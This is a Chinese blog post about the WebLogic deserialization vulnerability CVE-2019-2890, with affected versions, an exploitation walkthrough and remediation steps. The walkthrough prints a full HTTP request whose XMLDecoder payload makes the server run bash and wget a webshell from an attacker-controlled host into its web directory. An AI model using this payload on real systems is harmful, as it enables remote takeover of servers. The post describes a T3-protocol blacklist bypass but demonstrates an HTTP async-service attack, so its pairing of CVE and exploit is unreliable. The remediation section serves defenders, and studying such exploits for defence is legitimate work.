<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>WebLogic 反序列化漏洞(CVE-2019-2890) - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="WebLogic 反序列化漏洞(CVE-2019-2890)" />
<meta property="og:description" content="WebLogic 反序列化漏洞(CVE-2019-2890) 漏洞描述 2019年10月15日，Oracle官方发布了2019年10月安全更新公告，其中包含了一个可造成RCE远程任意代码执行的高危漏洞，漏洞编号为CVE-2019-2890。
Weblogic在利用T3协议进行远程资源加载调用时，默认会进行黑名单过滤以保证反序列化安全。本漏洞绕过了Weblogic的反序列化黑名单，使攻击者可以通过T3协议对存在漏洞的Weblogic组件实施远程攻击。由于T3协议在Weblogic控制台开启的情况下默认开启，而Weblogic默认安装会自动开启控制台，所以攻击者可通过此漏洞造成远程代码执行，以控制Weblogic服务器。
影响范围 WebLogic Server 10.3.6.0
WebLogic Server 12.1.3.0
WebLogic Server 12.2.1.3
漏洞利用 判断是否存在漏洞，如下图所示则可能存在漏洞 http://192.168.223.195:7001/_async/AsyncResponseService
（2）上传webshell
首先放置一个shell.txt到公网服务器上，我们使用wget去下载它。
报文如下：
POST /_async/AsyncResponseService HTTP/1.1
Host: 192.168.223.195:7001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Connection: close
Content-Length: 859
content-type: text/xml
&lt;soapenv:Envelope xmlns:soapenv=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34; xmlns:wsa=&#34;http://www.w3.org/2005/08/addressing&#34; xmlns:asy=&#34;http://www.bea.com/async/AsyncResponseService&#34;&gt; &lt;soapenv:Header&gt;
&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;
&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;
&lt;work:WorkContext xmlns:work=&#34;http://bea.com/2004/06/soap/workarea/&#34;&gt;
&lt;void class=&#34;java.lang.ProcessBuilder&#34;&gt;
&lt;array class=&#34;java.lang.String&#34; length=&#34;3&#34;&gt;
&lt;void index=&#34;0&#34;&gt;
&lt;string&gt;/bin/bash&lt;/string&gt;
&lt;/void&gt;
&lt;void index=&#34;1&#34;&gt;
&lt;string&gt;-c&lt;/string&gt;
&lt;/void&gt;
&lt;void index=&#34;2&#34;&gt;
&lt;string&gt;wget http://192.168.223.1:8080/shell.txt -O servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/shell." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/4a7ff3de704148be8bca3877e7f614f7/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2019-10-20T21:47:18+08:00" />
<meta property="article:modified_time" content="2019-10-20T21:47:18+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">WebLogic 反序列化漏洞(CVE-2019-2890)</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h2 style="margin-left:0cm;">WebLogic 反序列化漏洞(CVE-2019-2890)</h2> 
<h3 style="margin-left:0cm;">漏洞描述</h3> 
<p style="margin-left:0cm;">2019年10月15日，Oracle官方发布了2019年10月安全更新公告，其中包含了一个可造成RCE远程任意代码执行的高危漏洞，漏洞编号为CVE-2019-2890。</p> 
<p style="margin-left:0cm;">Weblogic在利用T3协议进行远程资源加载调用时，默认会进行黑名单过滤以保证反序列化安全。本漏洞绕过了Weblogic的反序列化黑名单，使攻击者可以通过T3协议对存在漏洞的Weblogic组件实施远程攻击。由于T3协议在Weblogic控制台开启的情况下默认开启，而Weblogic默认安装会自动开启控制台，所以攻击者可通过此漏洞造成远程代码执行，以控制Weblogic服务器。</p> 
<h3 style="margin-left:0cm;">影响范围</h3> 
<p style="margin-left:0cm;">WebLogic Server 10.3.6.0</p> 
<p style="margin-left:0cm;">WebLogic Server 12.1.3.0</p> 
<p style="margin-left:0cm;">WebLogic Server 12.2.1.3</p> 
<h3 style="margin-left:0cm;">漏洞利用</h3> 
<ol><li>判断是否存在漏洞，如下图所示则可能存在漏洞</li></ol> 
<p style="margin-left:0cm;">http://192.168.223.195:7001/_async/AsyncResponseService</p> 
<p style="margin-left:0cm;"><img alt="" class="has" height="278" src="https://images2.imgbox.com/1c/0e/Cb7anFM9_o.png" width="994"></p> 
<p style="margin-left:0cm;">（2）上传webshell</p> 
<p style="margin-left:0cm;">首先放置一个shell.txt到公网服务器上，我们使用wget去下载它。</p> 
<p style="margin-left:0cm;"><img alt="" class="has" height="473" src="https://images2.imgbox.com/d6/96/lrIQ8Z4O_o.png" width="847"></p> 
<p style="margin-left:0cm;">报文如下：</p> 
<p style="margin-left:0cm;">POST /_async/AsyncResponseService HTTP/1.1</p> 
<p style="margin-left:0cm;">Host: 192.168.223.195:7001</p> 
<p style="margin-left:0cm;">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0</p> 
<p style="margin-left:0cm;">Connection: close</p> 
<p style="margin-left:0cm;">Content-Length: 859</p> 
<p style="margin-left:0cm;">content-type: text/xml</p> 
<p style="margin-left:0cm;"> </p> 
<p style="margin-left:0cm;"> </p> 
<p style="margin-left:0cm;"> &lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"&gt;  </p> 
<p style="margin-left:0cm;">&lt;soapenv:Header&gt;</p> 
<p style="margin-left:0cm;">&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;</p> 
<p style="margin-left:0cm;">&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;</p> 
<p style="margin-left:0cm;">&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;</p> 
<p style="margin-left:0cm;">&lt;void class="java.lang.ProcessBuilder"&gt;</p> 
<p style="margin-left:0cm;">&lt;array class="java.lang.String" length="3"&gt;</p> 
<p style="margin-left:0cm;">&lt;void index="0"&gt;</p> 
<p style="margin-left:0cm;">&lt;string&gt;/bin/bash&lt;/string&gt;</p> 
<p style="margin-left:0cm;">&lt;/void&gt;</p> 
<p style="margin-left:0cm;">&lt;void index="1"&gt;</p> 
<p style="margin-left:0cm;">&lt;string&gt;-c&lt;/string&gt;</p> 
<p style="margin-left:0cm;">&lt;/void&gt;</p> 
<p style="margin-left:0cm;">&lt;void index="2"&gt;</p> 
<p style="margin-left:0cm;">&lt;string&gt;wget http://192.168.223.1:8080/shell.txt -O servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/shell.jsp&lt;/string&gt;</p> 
<p style="margin-left:0cm;">&lt;/void&gt;</p> 
<p style="margin-left:0cm;">&lt;/array&gt;</p> 
<p style="margin-left:0cm;">&lt;void method="start"/&gt;&lt;/void&gt;</p> 
<p style="margin-left:0cm;">&lt;/work:WorkContext&gt;</p> 
<p style="margin-left:0cm;">&lt;/soapenv:Header&gt;</p> 
<p style="margin-left:0cm;">&lt;soapenv:Body&gt;</p> 
<p style="margin-left:0cm;">&lt;asy:onAsyncDelivery/&gt;</p> 
<p style="margin-left:0cm;">&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</p> 
<p style="margin-left:0cm;">（3）访问webshell</p> 
<p style="margin-left:0cm;"><img alt="" class="has" height="384" src="https://images2.imgbox.com/4a/63/ANwJ5dod_o.png" width="823"></p> 
<h3 style="margin-left:0cm;">修复方案</h3> 
<p style="margin-left:0cm;">1.更新Oracle 2019年10月补丁</p> 
<p style="margin-left:0cm;">https://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html</p> 
<p style="margin-left:0cm;">2.控制T3协议的访问</p> 
<p style="margin-left:0cm;">此漏洞产生于WebLogic的T3服务，因此可通过控制T3协议的访问来临时阻断针对该漏洞的攻击。当开放WebLogic控制台端口（默认为7001端口）时，T3服务会默认开启。具体操作：</p> 
<p style="margin-left:0cm;">（1）进入WebLogic控制台，在base_domain的配置页面中，进入“安全”选项卡页面，点击“筛选器”，进入连接筛选器配置。</p> 
<p style="margin-left:0cm;">（2）在连接筛选器中输入：weblogic.security.net.ConnectionFilterImpl，在连接筛选器规则中输入：127.0.0.1 * * allow t3 t3s,0.0.0.0/0 * * deny t3 t3s（t3和t3s协议的所有端口只允许本地访问）。</p> 
<p style="margin-left:0cm;">（3）保存后需重新启动，规则方可生效。</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/15066f6874ddc8bdd1fd936127034410/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">练习5-2 找两个数中最大者 (10 分)</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/9c4f78a113f82206624d9e8dbf5d1197/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">ubuntu apt update 报错：无法安全地用该源进行更新，所以默认禁用该源</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>